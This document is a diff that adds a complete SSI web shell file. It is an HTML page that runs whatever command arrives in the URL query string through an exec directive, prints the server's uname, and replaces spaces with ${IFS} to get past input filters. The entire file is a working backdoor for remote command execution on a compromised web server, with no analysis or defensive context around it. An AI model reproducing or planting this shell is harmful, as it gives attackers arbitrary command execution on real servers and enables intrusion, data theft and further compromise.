@@ -1,0 +1,49 @@
+<!--#config errmsg="[Error! Web Tidak Support SSI Command!]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="ls" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script language="javascript">
+function fex()
+{
+	var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+}
+</script>
+<script>
+document.onkeydown = keydown;
+function keydown(e) {
+    if (!e) e = event;
+    if (e.keyCode === 13) {
+    	var uri = document.getElementById('command').value;
+    	var rep = uri.replace(/[ ]/g,'${IFS}');
+		var res = encodeURI(uri);
+        document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+
+    }
+}
+</script>
+</head>
+<body align="center" bgcolor="black" text="white">
+<font face=courier size=2><i>server : <b><font color=red><!--#exec cmd="{uname,-nr}"--></font><br>
+<input type=text size=60 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;">
+<hr>
+<b><!--#echo var=shl --></b><br>
+<textarea bgcolor=#000000 cols=121 rows=15>
+<!--#exec cmd=$shl -->
+</textarea>
+//<script>
+//$('body').on('input', 'input[name=address1]', function() {
+//$(this).val($(this).val().replace(' ', '${IFS}'));
+//});
+</script>
+<hr>
+</body>
+</html>
